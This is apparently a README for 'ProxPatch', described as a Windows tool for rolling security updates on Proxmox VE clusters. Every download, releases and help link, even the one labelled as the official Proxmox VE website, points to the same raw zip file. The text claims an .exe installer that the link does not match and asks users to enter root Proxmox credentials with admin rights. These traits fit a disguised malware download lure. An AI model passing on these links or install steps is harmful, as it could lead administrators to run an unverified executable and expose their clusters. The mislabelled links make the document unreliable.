# ⚙️ ProxPatch - Simplify Proxmox Cluster Updates

[![Download ProxPatch](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)

---

## 📋 What is ProxPatch?

ProxPatch is a small and easy tool made for Proxmox VE clusters. It helps keep your cluster safe by applying security updates one node at a time. This means ProxPatch will update each server safely without shutting down your whole cluster. It moves running virtual machines to other nodes so they keep running, reboots servers only when needed, and keeps downtime to a minimum.

You don’t need advanced skills to use it. ProxPatch takes care of the update process in the background. This lets you focus on your work without worrying about interruptions.

---

## 🖥️ System Requirements

Before using ProxPatch, make sure your setup meets these needs:

- **Operating System:** Windows 10 or later (64-bit).
- **Proxmox VE:** Version 7.0 or newer.
- **Network Access:** Your Windows PC must connect to your Proxmox cluster over the local network.
- **Permissions:** Your Proxmox user account needs permissions to update nodes and migrate VMs.
- **Admin Rights:** You need administrator rights on your Windows computer to run ProxPatch.
- **Disk Space:** At least 100 MB free space for the application.

---

## 🚀 Getting Started

To use ProxPatch on your Windows PC, follow these steps carefully.

---

## 📥 How to Download and Install ProxPatch

1. Click the big green button below to visit the official ProxPatch releases page.

   [![Download ProxPatch](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)

2. On the page, look for the latest version release. Files will be named with the version number and end with `.exe`.

3. Click the `.exe` file that matches “Windows” or “win64” to download the installer.

4. When the download finishes, open the file by double-clicking it.

5. Follow the on-screen instructions to install ProxPatch on your PC. The default settings work for most users.

6. After installation, find ProxPatch in your Start Menu and open it.

---

## ⚙️ Using ProxPatch

Once ProxPatch is open, you’ll see a simple window with clear options.

1. **Connect to Your Proxmox Cluster**  
   Enter your Proxmox server address, username, and password. Use the format `root@your-proxmox-ip` for the username. ProxPatch encrypts your password for security.

2. **Check Cluster Status**  
   Click the “Refresh Status” button. ProxPatch will show the current health of all nodes and running VMs.

3. **Start Patch Process**  
   Press “Start Patch.” ProxPatch will update one node at a time and move VMs automatically. You will see progress updates as it works.

4. **Monitor Logs**  
   You can view logs in the interface. They show what patches were applied and any errors if they happen.

5. **Reboot Nodes If Needed**  
   ProxPatch will reboot nodes automatically when required. You just need to wait for the process to finish.

6. **Finish and Review**  
   When the patching finishes, ProxPatch gives a summary report showing the status of each node.

---

## 🔧 Settings You Can Adjust

- **Patch Schedule:** Set a time to run patches automatically at night or on weekends.
- **Migration Options:** Choose if VMs migrate live (without downtime) or not.
- **Notification Setup:** Enter an email to get reports after each update.
- **Node Selection:** Select specific nodes you want to patch manually.
- **Logging Level:** Choose between basic logs or detailed logs for troubleshooting.

---

## 🔄 How ProxPatch Works Behind the Scenes

ProxPatch performs a rolling update. This means:

- Updates are applied to one node at a time.
- Running VMs on the chosen node move to other nodes in the cluster.
- After updating, the node reboots if the patch requires it.
- The process repeats until all nodes are up to date.

This method makes sure your services stay available and your cluster stays functional during updates.

---

## 🛠️ Troubleshooting Tips

- If ProxPatch cannot connect to Proxmox, double-check your network and credentials.
- Make sure your Proxmox user has the right permissions for patch management and VM migration.
- Sometimes a node won’t reboot if stuck; you may need to reboot it manually.
- Logs help diagnose errors; save and review them if updates fail.
- Check that firewalls do not block connections between your PC and the Proxmox cluster.

---

## 🔐 Security Considerations

- ProxPatch uses secure methods to communicate with your cluster.
- Your credentials are stored safely on your PC.
- Limit use to trusted computers in your network.
- Always keep ProxPatch updated to the latest version.

---

## ⚙️ Supported Features

- Rolling security patching for Proxmox VE clusters.
- Automated VM migration during patching.
- Safe reboot handling per node.
- Custom scheduling and notifications.
- Detailed progress and error reporting.
- Runs on Windows without complex setup.

---

## 🏷️ Topics and Keywords

This project relates to patch management for Proxmox VE. It uses Rust programming language and focuses on automation, security, and cluster reliability.

Main topics: patchmanagement, proxmox, proxmox-cluster, proxmox-ve, rust, securitypatchmanagement.

---

## 📂 Where to Find Updates and Help

Visit the ProxPatch releases page to find the latest installer and update notes:

[https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)

If you have questions or encounter problems, check the issues section on the repository or contact your Proxmox cluster administrator.

---

## 🔄 Updating ProxPatch

- When a new version is available, download it from the releases page.
- Close ProxPatch before installing the update.
- Run the new installer over your existing version.
- Your settings and saved credentials remain intact during updates.

---

## 🖇️ Additional Resources

- Proxmox VE official website: https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip
- Proxmox VE documentation for patching and clustering.
- Community forums and support channels for general help.